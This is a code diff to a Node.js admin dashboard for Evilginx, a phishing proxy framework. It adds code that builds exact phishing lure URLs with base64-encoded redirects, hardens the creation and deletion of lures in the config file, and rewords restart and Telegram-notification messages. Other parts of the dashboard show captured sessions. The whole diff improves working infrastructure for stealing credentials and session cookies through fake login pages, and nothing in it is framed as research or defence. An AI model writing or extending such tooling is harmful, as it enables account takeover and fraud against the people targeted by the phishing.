@@ -108,8 +108,27 @@ function getLuresAndDomains() {
         }
         if (currentLure) lures.push(currentLure);
 
-        // Resolve blank hostnames
+        // Resolve exact visual URLs matching the Go engine logic
+        const phishletSubdomains = getPhishletSubdomains();
         lures.forEach(lure => {
+          const rawHost = lure.hostname || '';
+          let finalHost = '';
+          if (rawHost !== '') {
+            finalHost = rawHost;
+          } else {
+            const domain = domainMap[lure.phishlet] || globalServer || 'unknown-domain';
+            const sub = phishletSubdomains[lure.phishlet] || '';
+            finalHost = sub ? `${sub}.${domain}` : domain;
+          }
+
+          let visualUrl = `https://${finalHost}${lure.path || ''}`;
+          if (lure.redirect_url) {
+            const encoded = Buffer.from(lure.redirect_url).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+            visualUrl += `?r=${encoded}`;
+          }
+          lure.exact_url = visualUrl;
+
+          // Legacy visual hostname fallback for index.ejs display fields
           if (!lure.hostname || lure.hostname === '') {
             lure.hostname = domainMap[lure.phishlet] || globalServer || 'unknown-domain';
           }
@@ -375,9 +394,9 @@ app.get('/', checkAuthenticated, async (req, res) => {
           } catch (e) { }
         }
       });
-      
+
       const deduplicatedData = [...data, ...Object.values(uniqueSessions)];
-      
+
       // Sort by time (latest first) to ensure chronological order is preserved after deduplication
       deduplicatedData.sort((a, b) => {
         const timeA = a.update_time || a.create_time || 0;
@@ -427,7 +446,7 @@ app.post('/settings/telegram', checkAuthenticated, (req, res) => {
   saveSettings(newSettings);
   writeYamlConfig(req.body.telegram_token, req.body.telegram_chatid, newSettings.notify_visit);
 
-  req.flash('success', 'Telegram settings saved. Engine is automatically restarting in the background...');
+  req.flash('success', 'Telegram settings saved. The system is automatically restarting in the background...');
   restartEvilginx();
   res.redirect('/settings');
 });
@@ -463,7 +482,7 @@ app.post('/create-lure', checkAuthenticated, (req, res) => {
 
   try {
     if (fs.existsSync(configPath)) {
-      let content = fs.readFileSync(configPath, 'utf8');
+      let content = fs.readFileSync(configPath, 'utf8').replace(/\r/g, '');
 
       const newLureYaml = `    - hostname: "${host}"
       path: ${path}
@@ -478,13 +497,16 @@ app.post('/create-lure', checkAuthenticated, (req, res) => {
       og_url: ""\n`;
 
       if (/^lures:/m.test(content)) {
-        content = content.replace(/^lures:\n/m, `lures:\n${newLureYaml}`);
+        content = content.replace(/^lures:\s*\n/m, `lures:\n${newLureYaml}`);
       } else {
-        content += `\nlures:\n${newLureYaml}`;
+        if (content.length > 0 && !content.endsWith('\n')) {
+          content += '\n';
+        }
+        content += `lures:\n${newLureYaml}`;
       }
 
       fs.writeFileSync(configPath, content, 'utf8');
-      req.flash('success', 'Lure created. Engine is automatically restarting to apply this lure...');
+      req.flash('success', 'Lure created. The system is automatically restarting...');
       restartEvilginx();
     }
   } catch (e) {
@@ -500,8 +522,8 @@ app.post('/delete-lure', checkAuthenticated, (req, res) => {
 
   try {
     if (fs.existsSync(configPath)) {
-      let content = fs.readFileSync(configPath, 'utf8');
-      const luresMatch = content.match(/^lures:\n([\s\S]*?)(?:^[a-zA-Z_0-9]+:|\Z)/m);
+      let content = fs.readFileSync(configPath, 'utf8').replace(/\r/g, '');
+      const luresMatch = content.match(/^lures:\s*\n([\s\S]*?)(?:^[a-zA-Z_0-9]+:|\Z)/m);
 
       if (luresMatch && luresMatch[1]) {
         const luresBlock = luresMatch[1];
@@ -523,7 +545,7 @@ app.post('/delete-lure', checkAuthenticated, (req, res) => {
         const newLuresBlock = newLines.join('\n');
         content = content.replace(luresBlock, newLuresBlock + (newLines.length && !newLuresBlock.endsWith('\n') ? '\n' : ''));
         fs.writeFileSync(configPath, content, 'utf8');
-        req.flash('success', 'Lure deleted. Engine is automatically restarting in the background...');
+        req.flash('success', 'Lure deleted. The system is automatically restarting in the background...');
         restartEvilginx();
       }
     }
@@ -548,7 +570,7 @@ app.post('/test-telegram', checkAuthenticated, async (req, res) => {
   }
 
   try {
-    await sendTelegramMessage(token, chatid, "<b>Success!</b> Your Telegram bot is connected successfully on this VPS.");
+    await sendTelegramMessage(token, chatid, "<b>Success!</b> Your Telegram bot is connected successfully.");
     res.json({ success: true });
   } catch (e) {
     res.json({ success: false, error: e.toString() });
